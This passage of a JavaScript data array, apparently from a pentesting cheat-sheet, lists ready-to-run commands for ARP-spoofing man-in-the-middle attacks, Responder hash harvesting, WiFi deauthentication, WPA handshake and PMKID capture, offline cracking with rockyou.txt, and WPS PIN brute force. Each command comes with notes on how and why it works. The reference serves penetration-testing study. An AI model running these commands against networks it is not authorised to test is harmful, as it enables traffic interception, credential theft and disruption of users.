  { track:'pentesting', cat:'mitm', title:'ARP spoofing (bidirectional MITM)',
    code:'echo 1 > /proc/sys/net/ipv4/ip_forward\narpspoof -i eth0 -t {IP} <gateway-ip>\narpspoof -i eth0 -t <gateway-ip> {IP}',
    note:'Enable IP forwarding first so traffic still reaches its real destination through you, then poison both directions — the target\'s ARP cache thinks you\'re the gateway, and the gateway\'s cache thinks you\'re the target.' },
  { track:'pentesting', cat:'mitm', title:'Ettercap MITM',
    code:'ettercap -T -q -i eth0 -M arp:remote /{IP}// /<gateway-ip>//',
    note:'Wraps ARP spoofing plus a plugin ecosystem (traffic filtering, credential harvesting) into one tool — arp:remote also catches traffic destined off-subnet, not just direct target-to-gateway.' },
  { track:'pentesting', cat:'mitm', title:'Bettercap (modern alternative)',
    code:'bettercap -iface eth0 -eval "set arp.spoof.targets {IP}; arp.spoof on; net.sniff on"',
    note:'The actively maintained successor to ettercap — same ARP spoofing core, but with a much broader modern module set (HTTPS proxying, WiFi, BLE) once you outgrow the basics.' },
  { track:'pentesting', cat:'mitm', title:'Responder (LLMNR/NBT-NS poisoning)',
    code:'responder -I eth0 -wrf',
    note:'Doesn\'t touch ARP at all — answers broken name-resolution broadcasts (LLMNR, NBT-NS) that Windows sends whenever DNS fails, harvesting NTLM hashes from any machine on the segment that asks "who has this hostname?".' },

  // ---------- wifi ----------
  { track:'pentesting', cat:'wifi', title:'Enable monitor mode',
    code:'airmon-ng check kill\nairmon-ng start wlan0',
    note:'Kills processes that interfere with monitor mode (NetworkManager, wpa_supplicant), then puts the adapter into monitor mode as wlan0mon — required before any capture or injection below.' },
  { track:'pentesting', cat:'wifi', title:'Capture a WPA handshake',
    code:'airodump-ng --bssid <BSSID> --channel <CH> --write capture wlan0mon',
    note:'Passively listens on the target AP\'s channel and writes every packet to disk — you need a client to (re)connect while this runs to actually capture the 4-way handshake.' },
  { track:'pentesting', cat:'wifi', title:'Deauth to force a handshake',
    code:'aireplay-ng --deauth 5 -a <BSSID> wlan0mon',
    note:'Kicks connected clients off the AP, forcing an automatic reconnect that you capture with airodump-ng running in parallel — 5 deauth frames is usually enough without being needlessly disruptive.' },
  { track:'pentesting', cat:'wifi', title:'Crack the handshake',
    code:'aircrack-ng capture-01.cap -w rockyou.txt',
    note:'Only as good as the wordlist — WPA2 cracking is entirely offline dictionary/brute-force against the captured handshake, there\'s no shortcut around a strong passphrase that isn\'t in your list.' },
  { track:'pentesting', cat:'wifi', title:'PMKID attack (no client needed)',
    code:'hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1\nhcxpcapngtool capture.pcapng -o hash.22000\nhashcat -m 22000 hash.22000 rockyou.txt',
    note:'Grabs the PMKID from the AP\'s very first EAPOL frame — works without waiting for a client to connect or sending any deauth, much stealthier than the handshake-capture approach above.' },
  { track:'pentesting', cat:'wifi', title:'WPS PIN attack',
    code:'reaver -i wlan0mon -b <BSSID> -vv',
    note:'Brute-forces the WPS PIN (only ~11,000 possible values thanks to a design flaw) to recover the WPA passphrase directly — only works on APs that still have WPS enabled, increasingly rare but still worth checking.' }
];
